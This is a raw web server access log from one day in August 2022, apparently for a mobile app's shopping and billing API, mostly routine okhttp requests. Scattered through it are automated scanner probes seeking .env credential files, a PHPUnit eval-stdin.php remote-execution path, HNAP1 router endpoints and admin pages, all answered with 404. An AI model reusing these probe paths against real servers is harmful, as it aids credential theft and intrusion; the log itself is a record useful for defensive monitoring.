::ffff:127.0.0.1 - - [30/Aug/2022:16:18:53 +0000] "GET /1Kku HTTP/1.0" 404 143 "-" "curl/7.54.0"
::1 - - [30/Aug/2022:16:18:53 +0000] "GET /default.html HTTP/1.0" 404 151 "-" "curl/7.54.0"
::ffff:127.0.0.1 - - [30/Aug/2022:16:18:53 +0000] "GET /pools HTTP/1.0" 404 144 "-" "curl/7.54.0"
::1 - - [30/Aug/2022:16:18:53 +0000] "GET / HTTP/1.0" 404 139 "-" "curl/7.54.0"
::ffff:127.0.0.1 - - [30/Aug/2022:16:18:54 +0000] "GET /start.cfm HTTP/1.0" 404 148 "-" "curl/7.54.0"
::1 - - [30/Aug/2022:16:18:55 +0000] "GET /favicon.ico HTTP/1.0" 404 150 "-" "curl/7.54.0"
::ffff:127.0.0.1 - - [30/Aug/2022:16:18:55 +0000] "GET / HTTP/1.0" 404 139 "-" "curl/7.54.0"
::1 - - [30/Aug/2022:16:18:55 +0000] "GET /admin.cgi HTTP/1.0" 404 148 "-" "curl/7.54.0"
::ffff:127.0.0.1 - - [30/Aug/2022:16:18:55 +0000] "GET /default.cfm HTTP/1.0" 404 150 "-" "curl/7.54.0"
::1 - - [30/Aug/2022:16:18:56 +0000] "GET /robots.txt HTTP/1.0" 404 149 "-" "curl/7.54.0"
::ffff:127.0.0.1 - - [30/Aug/2022:16:18:57 +0000] "GET /admin.php HTTP/1.0" 404 148 "-" "curl/7.54.0"
::1 - - [30/Aug/2022:16:18:58 +0000] "GET /admin.shtml HTTP/1.0" 404 150 "-" "curl/7.54.0"
::ffff:127.0.0.1 - - [30/Aug/2022:16:18:58 +0000] "GET /menu.jhtml HTTP/1.0" 404 149 "-" "curl/7.54.0"
::1 - - [30/Aug/2022:16:18:58 +0000] "GET /localstart.pl HTTP/1.0" 404 152 "-" "curl/7.54.0"
::ffff:127.0.0.1 - - [30/Aug/2022:16:18:59 +0000] "GET /main.jsa HTTP/1.0" 404 147 "-" "curl/7.54.0"
::1 - - [30/Aug/2022:16:18:59 +0000] "GET /admin.pl HTTP/1.0" 404 147 "-" "curl/7.54.0"
::ffff:127.0.0.1 - - [30/Aug/2022:16:19:00 +0000] "GET /default.jhtml HTTP/1.0" 404 152 "-" "curl/7.54.0"
::1 - - [30/Aug/2022:16:19:00 +0000] "GET /readme.txt HTTP/1.0" 404 149 "-" "curl/7.54.0"
::ffff:127.0.0.1 - - [30/Aug/2022:16:19:00 +0000] "GET /base.jsa HTTP/1.0" 404 147 "-" "curl/7.54.0"
::1 - - [30/Aug/2022:16:19:01 +0000] "GET /inicio.php HTTP/1.0" 404 149 "-" "curl/7.54.0"
::ffff:127.0.0.1 - - [30/Aug/2022:16:19:01 +0000] "GET /inicio.aspx HTTP/1.0" 404 150 "-" "curl/7.54.0"
::1 - - [30/Aug/2022:16:19:02 +0000] "GET / HTTP/1.0" 404 139 "-" "-"
::ffff:127.0.0.1 - - [30/Aug/2022:16:19:02 +0000] "GET / HTTP/1.0" 404 139 "-" "-"
::1 - - [30/Aug/2022:16:20:10 +0000] "GET /api/v1/goods/user HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [30/Aug/2022:16:20:21 +0000] "GET /api/v1/goods/user HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [30/Aug/2022:16:20:49 +0000] "GET /api/v1/transactions/profit HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [30/Aug/2022:16:22:03 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [30/Aug/2022:16:22:03 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [30/Aug/2022:16:22:08 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [30/Aug/2022:16:22:08 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [30/Aug/2022:16:22:08 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [30/Aug/2022:16:22:24 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [30/Aug/2022:16:22:41 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [30/Aug/2022:16:22:41 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [30/Aug/2022:16:22:55 +0000] "GET /upload/undefined HTTP/1.0" 404 155 "-" "okhttp/4.9.2"
::1 - - [30/Aug/2022:16:22:55 +0000] "GET /api/v1/goods/630db873f66eb6d6a871fbb3 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [30/Aug/2022:16:22:55 +0000] "GET /api/v1/transactions/user?good=630db873f66eb6d6a871fbb3&sort=-createdAt HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [30/Aug/2022:16:22:55 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [30/Aug/2022:16:22:55 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [30/Aug/2022:16:23:02 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [30/Aug/2022:16:23:02 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [30/Aug/2022:16:23:08 +0000] "GET /upload/undefined HTTP/1.0" 404 155 "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [30/Aug/2022:16:23:08 +0000] "GET /api/v1/goods/630db873f66eb6d6a871fbb3 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [30/Aug/2022:16:23:08 +0000] "GET /api/v1/transactions/user?good=630db873f66eb6d6a871fbb3&sort=-createdAt HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [30/Aug/2022:16:23:08 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [30/Aug/2022:16:23:09 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [30/Aug/2022:16:23:10 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [30/Aug/2022:16:23:10 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [30/Aug/2022:16:26:33 +0000] "POST /api/v1/transactions HTTP/1.0" 200 257 "-" "okhttp/4.9.2"
::1 - - [30/Aug/2022:16:26:33 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 200 434 "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [30/Aug/2022:16:26:33 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 200 434 "-" "okhttp/4.9.2"
::1 - - [30/Aug/2022:16:38:34 +0000] "POST /api/v1/bills/drain HTTP/1.0" 200 320 "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [30/Aug/2022:16:38:35 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 200 122 "-" "okhttp/4.9.2"
::1 - - [30/Aug/2022:16:38:35 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 200 122 "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [30/Aug/2022:16:41:55 +0000] "POST / HTTP/1.0" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::1 - - [30/Aug/2022:16:41:56 +0000] "GET /.env HTTP/1.0" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::1 - - [30/Aug/2022:16:42:17 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [30/Aug/2022:16:42:17 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 200 3409 "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [30/Aug/2022:16:42:19 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [30/Aug/2022:16:44:50 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [30/Aug/2022:16:44:50 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [30/Aug/2022:16:44:50 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [30/Aug/2022:16:44:51 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [30/Aug/2022:16:44:51 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [30/Aug/2022:16:44:51 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [30/Aug/2022:16:44:56 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [30/Aug/2022:16:45:23 +0000] "GET /.env HTTP/1.0" 404 143 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.7; rv:20.0) Gecko/20100101 Firefox/20.0"
::ffff:127.0.0.1 - - [30/Aug/2022:16:46:43 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [30/Aug/2022:16:46:43 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [30/Aug/2022:16:47:46 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [30/Aug/2022:16:47:46 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [30/Aug/2022:16:47:46 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [30/Aug/2022:16:47:49 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [30/Aug/2022:16:47:49 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [30/Aug/2022:16:47:49 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [30/Aug/2022:16:47:57 +0000] "GET /api/v1/categories HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [30/Aug/2022:16:47:58 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [30/Aug/2022:16:47:58 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [30/Aug/2022:16:54:25 +0000] "GET /api/v1/transactions/profit HTTP/1.0" 200 3819 "-" "okhttp/4.9.2"
::1 - - [30/Aug/2022:16:54:33 +0000] "GET /api/v1/goods/user HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [30/Aug/2022:16:55:11 +0000] "GET /api/v1/bills/user?limit=1000&sort=-createdAt&type=%D0%9E%D1%80%D0%BB%D0%BE%D0%B3%D0%BE HTTP/1.0" 200 2447 "-" "okhttp/4.9.2"
::1 - - [30/Aug/2022:16:55:24 +0000] "GET /api/v1/transactions/profit HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [30/Aug/2022:17:04:23 +0000] "GET / HTTP/1.0" 404 139 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7"
::1 - - [30/Aug/2022:17:04:28 +0000] "GET /.env HTTP/1.0" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:127.0.0.1 - - [30/Aug/2022:17:04:28 +0000] "POST / HTTP/1.0" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::1 - - [30/Aug/2022:17:11:12 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [30/Aug/2022:17:11:14 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [30/Aug/2022:17:11:19 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [30/Aug/2022:17:11:21 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [30/Aug/2022:17:11:24 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [30/Aug/2022:17:11:26 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [30/Aug/2022:17:11:28 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [30/Aug/2022:17:11:28 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [30/Aug/2022:17:11:51 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [30/Aug/2022:17:11:51 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [30/Aug/2022:17:11:53 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [30/Aug/2022:17:11:57 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [30/Aug/2022:17:12:21 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [30/Aug/2022:17:12:22 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [30/Aug/2022:17:12:23 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [30/Aug/2022:17:12:24 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [30/Aug/2022:17:15:09 +0000] "GET /api/v1/goods/user HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [30/Aug/2022:17:19:31 +0000] "GET /api/v1/goods/user HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [30/Aug/2022:17:20:16 +0000] "GET /api/v1/transactions/profit HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [30/Aug/2022:17:23:54 +0000] "GET / HTTP/1.0" 404 139 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36"
::1 - - [30/Aug/2022:17:24:26 +0000] "GET /api/v1/goods/user HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [30/Aug/2022:17:30:04 +0000] "GET /api/v1/transactions/profit HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [30/Aug/2022:17:30:06 +0000] "POST / HTTP/1.0" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:127.0.0.1 - - [30/Aug/2022:17:30:06 +0000] "GET /.env HTTP/1.0" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::1 - - [30/Aug/2022:17:30:10 +0000] "GET /api/v1/bills/debt?type=%D0%9E%D1%80%D0%BB%D0%BE%D0%B3%D0%BE HTTP/1.0" 200 134 "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [30/Aug/2022:17:30:39 +0000] "GET /api/v1/bills/debt?type=%D0%97%D0%B0%D1%80%D0%BB%D0%B0%D0%B3%D0%B0 HTTP/1.0" 200 134 "-" "okhttp/4.9.2"
::1 - - [30/Aug/2022:17:30:45 +0000] "GET /api/v1/bills/debt?type=%D0%9E%D1%80%D0%BB%D0%BE%D0%B3%D0%BE HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [30/Aug/2022:17:33:05 +0000] "GET /api/v1/bills/debt?type=%D0%97%D0%B0%D1%80%D0%BB%D0%B0%D0%B3%D0%B0 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [30/Aug/2022:17:35:57 +0000] "GET /api/v1/transactions/profit HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [30/Aug/2022:18:01:46 +0000] "GET /api/v1/transactions/profit HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [30/Aug/2022:18:02:54 +0000] "GET / HTTP/1.0" 404 139 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
::ffff:127.0.0.1 - - [30/Aug/2022:18:03:53 +0000] "GET /api/v1/transactions/profit HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [30/Aug/2022:18:05:29 +0000] "GET /api/v1/transactions/profit HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [30/Aug/2022:18:05:36 +0000] "GET /api/v1/transactions/profit HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [30/Aug/2022:18:05:45 +0000] "POST / HTTP/1.0" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:127.0.0.1 - - [30/Aug/2022:18:05:45 +0000] "GET /.env HTTP/1.0" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::1 - - [30/Aug/2022:18:05:47 +0000] "GET /api/v1/goods/user HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [30/Aug/2022:18:06:43 +0000] "GET /api/v1/transactions/profit HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [30/Aug/2022:18:06:44 +0000] "GET /api/v1/bills/debt?type=%D0%9E%D1%80%D0%BB%D0%BE%D0%B3%D0%BE HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [30/Aug/2022:18:06:47 +0000] "GET /api/v1/bills/debt?type=%D0%97%D0%B0%D1%80%D0%BB%D0%B0%D0%B3%D0%B0 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [30/Aug/2022:18:07:06 +0000] "GET /api/v1/goods/user HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [30/Aug/2022:18:07:16 +0000] "GET /api/v1/bills/user?limit=1000&sort=-createdAt&type=%D0%9E%D1%80%D0%BB%D0%BE%D0%B3%D0%BE HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [30/Aug/2022:18:18:23 +0000] "GET /api/v1/bills/user?limit=1000&sort=-createdAt&type=%D0%9E%D1%80%D0%BB%D0%BE%D0%B3%D0%BE HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [30/Aug/2022:18:18:27 +0000] "GET /api/v1/goods/user HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [30/Aug/2022:18:18:43 +0000] "GET /api/v1/transactions/profit HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [30/Aug/2022:18:25:59 +0000] "GET / HTTP/1.0" 404 139 "-" "-"
::1 - - [30/Aug/2022:18:26:00 +0000] "POST /HNAP1/ HTTP/1.0" 404 146 "-" "Mozila/5.0"
::ffff:127.0.0.1 - - [30/Aug/2022:18:26:10 +0000] "GET /api/v1/templates?createUser=62f2688099e2a94b91d43777 HTTP/1.0" 200 856 "-" "okhttp/4.9.2"
::1 - - [30/Aug/2022:18:26:15 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [30/Aug/2022:18:26:15 +0000] "GET /api/v1/templates?createUser=62f2688099e2a94b91d43777 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [30/Aug/2022:18:26:15 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [30/Aug/2022:18:26:17 +0000] "GET /api/v1/users/62f2688099e2a94b91d43777 HTTP/1.0" 200 283 "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [30/Aug/2022:18:26:17 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [30/Aug/2022:18:26:17 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [30/Aug/2022:18:26:19 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [30/Aug/2022:18:26:19 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [30/Aug/2022:18:26:20 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [30/Aug/2022:18:26:20 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [30/Aug/2022:18:26:21 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [30/Aug/2022:18:26:21 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [30/Aug/2022:18:26:23 +0000] "GET /api/v1/templates?createUser=62f2688099e2a94b91d43777 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [30/Aug/2022:18:26:23 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [30/Aug/2022:18:26:24 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [30/Aug/2022:18:26:25 +0000] "GET /api/v1/templates?createUser=62f2688099e2a94b91d43777 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [30/Aug/2022:18:26:34 +0000] "GET /api/v1/goods/user HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::1 - - [30/Aug/2022:18:26:38 +0000] "GET /api/v1/transactions/basket?limit=100&sort=-createdAt HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [30/Aug/2022:18:26:38 +0000] "GET /api/v1/goods/user?limit=100 HTTP/1.0" 304 - "-" "okhttp/4.9.2"
::ffff:127.0.0.1 - - [30/Aug/2022:18:35:59 +0000] "POST / HTTP/1.0" 404 140 "-" "Mozilla/5.0 (Macintosh;                 Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML,                 like Gecko) Chrome/39.0.2171.95 Safari/537.36"
::1 - - [30/Aug/2022:18:35:59 +0000] "GET /.env HTTP/1.0" 404 143 "-" "Mozilla/5.0 (Macintosh;                 Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML,                 like Gecko) Chrome/39.0.2171.95 Safari/537.36"
::ffff:127.0.0.1 - - [30/Aug/2022:18:36:00 +0000] "GET /vendor/.env HTTP/1.0" 404 150 "-" "Mozilla/5.0 (Macintosh;                 Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML,                 like Gecko) Chrome/39.0.2171.95 Safari/537.36"
::1 - - [30/Aug/2022:18:36:00 +0000] "GET /admin/.env HTTP/1.0" 404 149 "-" "Mozilla/5.0 (Macintosh;                 Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML,                 like Gecko) Chrome/39.0.2171.95 Safari/537.36"
::ffff:127.0.0.1 - - [30/Aug/2022:18:36:01 +0000] "GET /159.223.82.71/.env HTTP/1.0" 404 157 "-" "Mozilla/5.0 (Macintosh;                 Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML,                 like Gecko) Chrome/39.0.2171.95 Safari/537.36"
::1 - - [30/Aug/2022:18:36:01 +0000] "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.0" 404 189 "-" "Mozilla/5.0 (Macintosh;                 Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML,                 like Gecko) Chrome/39.0.2171.95 Safari/537.36"
::1 - - [30/Aug/2022:19:08:23 +0000] "POST / HTTP/1.0" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:127.0.0.1 - - [30/Aug/2022:19:08:24 +0000] "GET /.env HTTP/1.0" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::1 - - [30/Aug/2022:19:19:23 +0000] "GET / HTTP/1.0" 404 139 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36"
::ffff:127.0.0.1 - - [30/Aug/2022:19:49:24 +0000] "GET / HTTP/1.0" 404 139 "-" "Mozilla/5.0 (Windows NT 5.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36"
::1 - - [30/Aug/2022:19:57:47 +0000] "POST / HTTP/1.0" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:127.0.0.1 - - [30/Aug/2022:19:57:47 +0000] "GET /.env HTTP/1.0" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::1 - - [30/Aug/2022:20:01:07 +0000] "GET / HTTP/1.0" 404 139 "-" "-"
::ffff:127.0.0.1 - - [30/Aug/2022:20:05:39 +0000] "GET /.env HTTP/1.0" 404 143 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::1 - - [30/Aug/2022:20:05:40 +0000] "POST / HTTP/1.0" 404 140 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
::ffff:127.0.0.1 - - [30/Aug/2022:20:08:40 +0000] "GET / HTTP/1.0" 404 139 "-" "-"
::1 - - [30/Aug/2022:20:34:39 +0000] "GET /index/index/id/28.html HTTP/1.0" 404 161 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 10_0 like Mac OS X) AppleWebKit/602.1.38 (KHTML, like Gecko) Version/10.0 Mobile/14A5297c Safari/602.1"
::ffff:127.0.0.1 - - [30/Aug/2022:20:52:13 +0000] "GET / HTTP/1.0" 404 139 "-" "-"
::1 - - [30/Aug/2022:20:52:16 +0000] "POST /HNAP1/ HTTP/1.0" 404 146 "-" "Mozila/5.0"
